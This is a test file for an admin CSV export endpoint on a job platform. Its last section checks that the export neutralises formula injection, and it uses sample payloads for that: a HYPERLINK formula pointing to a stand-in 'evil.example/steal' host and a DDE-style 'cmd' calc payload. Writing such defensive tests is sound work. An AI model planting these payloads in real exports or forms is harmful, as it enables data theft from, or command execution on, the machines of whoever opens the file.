"""Tests for the admin CSV export endpoint — the 'jobs' kind used to write
only a header row and never query, producing an empty file for every export.
"""
import asyncio
import uuid

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.db.base import Base
from app.models import Company, Job, JobApplication, NewsletterSubscriber, Transaction, User, UserRole
from app.api.v1.admin import admin_export_csv


@pytest.fixture()
def db():
    engine = create_engine("sqlite+pysqlite:///:memory:")
    Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine)
    session = Session()
    yield session
    session.close()


def _make_admin(db):
    admin = User(id=str(uuid.uuid4()), email=f"admin-{uuid.uuid4()}@parvagas.pt", full_name="Admin", password_hash="x", role=UserRole.admin)
    db.add(admin)
    db.commit()
    return admin


def test_jobs_export_includes_every_job(db):
    admin = _make_admin(db)
    owner = User(id=str(uuid.uuid4()), email="owner@x.com", full_name="Owner", password_hash="x", role=UserRole.company)
    db.add(owner)
    db.flush()
    company = Company(owner_user_id=owner.id, name="Acme", status="active")
    db.add(company)
    db.flush()
    db.add(Job(company_id=company.id, title="Vaga Um", status="approved", visibility="public"))
    db.add(Job(company_id=company.id, title="Vaga Dois", status="pending_platform_review", visibility="private"))
    db.commit()

    response = asyncio.run(admin_export_csv("jobs", from_date=None, to_date=None, db=db, current_user=admin))
    body = response.body.decode("utf-8")

    assert "Vaga Um" in body
    assert "Vaga Dois" in body
    assert "id,title,status,visibility,companyId,createdAt" in body


def test_jobs_export_empty_when_no_jobs(db):
    admin = _make_admin(db)
    response = asyncio.run(admin_export_csv("jobs", from_date=None, to_date=None, db=db, current_user=admin))
    body = response.body.decode("utf-8")
    lines = [line for line in body.strip().split("\r\n") if line]
    assert lines == ["id,title,status,visibility,companyId,createdAt"]


def test_applications_export_includes_every_application(db):
    admin = _make_admin(db)
    owner = User(id=str(uuid.uuid4()), email="owner2@x.com", full_name="Owner", password_hash="x", role=UserRole.company)
    db.add(owner)
    db.flush()
    company = Company(owner_user_id=owner.id, name="Acme", status="active")
    db.add(company)
    db.flush()
    db.add(JobApplication(
        job_id=str(uuid.uuid4()), company_id=company.id,
        applicant_full_name="Ana Sousa", applicant_email="ana@x.com", status="submitted",
    ))
    db.commit()

    response = asyncio.run(admin_export_csv("applications", from_date=None, to_date=None, db=db, current_user=admin))
    body = response.body.decode("utf-8")

    assert "Ana Sousa" in body
    assert "id,jobId,companyId,applicantFullName,applicantEmail,status,createdAt" in body


def test_transactions_export_includes_every_transaction(db):
    admin = _make_admin(db)
    owner = User(id=str(uuid.uuid4()), email="owner3@x.com", full_name="Owner", password_hash="x", role=UserRole.company)
    db.add(owner)
    db.flush()
    company = Company(owner_user_id=owner.id, name="Acme", status="active")
    db.add(company)
    db.flush()
    db.add(Transaction(company_id=company.id, amount=5000, provider="multicaixa", status="paid", kind="subscription"))
    db.commit()

    response = asyncio.run(admin_export_csv("transactions", from_date=None, to_date=None, db=db, current_user=admin))
    body = response.body.decode("utf-8")

    assert "multicaixa" in body
    assert "paid" in body
    assert "id,companyId,amount,currency,provider,reference,status,kind,createdAt" in body


def test_newsletter_export_includes_every_subscriber(db):
    admin = _make_admin(db)
    db.add(NewsletterSubscriber(email="subscriber@x.com", source="footer"))
    db.commit()

    response = asyncio.run(admin_export_csv("newsletter", from_date=None, to_date=None, db=db, current_user=admin))
    body = response.body.decode("utf-8")

    assert "subscriber@x.com" in body
    assert "id,email,source,unsubscribedAt,createdAt" in body


def test_unsupported_export_kind_400(db):
    admin = _make_admin(db)
    with pytest.raises(Exception) as exc:
        asyncio.run(admin_export_csv("bogus", from_date=None, to_date=None, db=db, current_user=admin))
    assert getattr(exc.value, "status_code", None) == 400


# ── CSV/formula injection (CWE-1236) ──────────────────────────────────────
# applications/newsletter source fields from unauthenticated public forms
# (quick-apply, newsletter signup) — a value starting with =, +, -, @, tab,
# or CR/LF must never reach the exported cell unescaped, since Excel/Sheets
# evaluate it as a live formula when an admin opens the file.

def test_applications_export_neutralises_formula_injection_in_full_name(db):
    admin = _make_admin(db)
    owner = User(id=str(uuid.uuid4()), email="owner4@x.com", full_name="Owner", password_hash="x", role=UserRole.company)
    db.add(owner)
    db.flush()
    company = Company(owner_user_id=owner.id, name="Acme", status="active")
    db.add(company)
    db.flush()
    db.add(JobApplication(
        job_id=str(uuid.uuid4()), company_id=company.id,
        applicant_full_name='=HYPERLINK("http://evil.example/steal","x")',
        applicant_email="attacker@x.com", status="submitted",
    ))
    db.commit()

    response = asyncio.run(admin_export_csv("applications", from_date=None, to_date=None, db=db, current_user=admin))
    body = response.body.decode("utf-8")

    # The cell must not start with '=' (a live formula trigger) — it must be
    # prefixed with a quote that forces spreadsheet apps to treat it as text.
    assert ',"\'=HYPERLINK' in body
    assert ',=HYPERLINK' not in body


def test_newsletter_export_neutralises_formula_injection_in_email(db):
    admin = _make_admin(db)
    # A formula-shaped local part like this still matches the app's basic
    # email-format regex, so it can genuinely reach storage.
    db.add(NewsletterSubscriber(email="=2+2@x.com", source="+SUM(A1:A9)"))
    db.commit()

    response = asyncio.run(admin_export_csv("newsletter", from_date=None, to_date=None, db=db, current_user=admin))
    body = response.body.decode("utf-8")

    assert "\n=2+2@x.com" not in body and ",=2+2@x.com" not in body
    assert "'=2+2@x.com" in body
    assert "'+SUM(A1:A9)" in body


def test_csv_safe_cell_leaves_ordinary_values_untouched():
    from app.api.v1.admin import _csv_safe_cell

    assert _csv_safe_cell("Ana Sousa") == "Ana Sousa"
    assert _csv_safe_cell(42) == 42
    assert _csv_safe_cell(True) is True
    assert _csv_safe_cell(None) is None


@pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r", "\n"])
def test_csv_safe_cell_quotes_every_formula_trigger_character(trigger):
    from app.api.v1.admin import _csv_safe_cell

    payload = f"{trigger}cmd|'/c calc'!A0"
    assert _csv_safe_cell(payload) == "'" + payload
